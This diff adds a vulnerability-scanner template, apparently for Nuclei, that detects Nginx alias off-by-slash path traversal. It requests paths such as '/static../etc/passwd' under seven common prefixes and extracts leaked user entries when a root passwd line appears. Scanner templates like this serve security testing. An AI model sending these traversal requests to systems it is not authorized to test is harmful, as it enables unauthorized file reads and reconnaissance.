@@ -1,0 +1,54 @@
+# gap: nginx-alias-traversal-misconfiguration
+id: nginx-alias-traversal-misconfiguration
+
+info:
+  name: Nginx Alias Directive Off-By-Slash Path Traversal
+  author: TyrusRC
+  severity: high
+  description: |
+    Probes common alias-style location prefixes (static, assets, images,
+    files, css, js, uploads) with the classic off-by-slash sequence ".."
+    appended directly to the prefix. When an Nginx alias directive maps a
+    location like `/static` to a filesystem path without a trailing slash on
+    both sides, the request `/static../etc/passwd` resolves to a path one
+    directory above the alias target, allowing arbitrary file read. A
+    canonical /etc/passwd root entry in the response body confirms the
+    misconfiguration. Requires the target to use Nginx with at least one of
+    the probed alias prefixes; non-matching deployments simply 404.
+  reference:
+    - https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Reverse%20Proxy%20Misconfigurations/README.md
+    - https://www.acunetix.com/vulnerabilities/web/nginx-alias-traversal/
+  tags: custom,misconfig,nginx,traversal,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static../etc/passwd"
+      - "{{BaseURL}}/assets../etc/passwd"
+      - "{{BaseURL}}/images../etc/passwd"
+      - "{{BaseURL}}/files../etc/passwd"
+      - "{{BaseURL}}/css../etc/passwd"
+      - "{{BaseURL}}/js../etc/passwd"
+      - "{{BaseURL}}/uploads../etc/passwd"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
+
+    extractors:
+      - type: regex
+        part: body
+        name: leaked-user-entries
+        regex:
+          - '([a-z_][a-z0-9_-]{0,31}):[x*!]?:([0-9]+):([0-9]+):[^:]*:[^:]*:(/[^\r\n:]*)'
+        group: 0
+      - type: kval
+        part: header
+        kval:
+          - "Server"
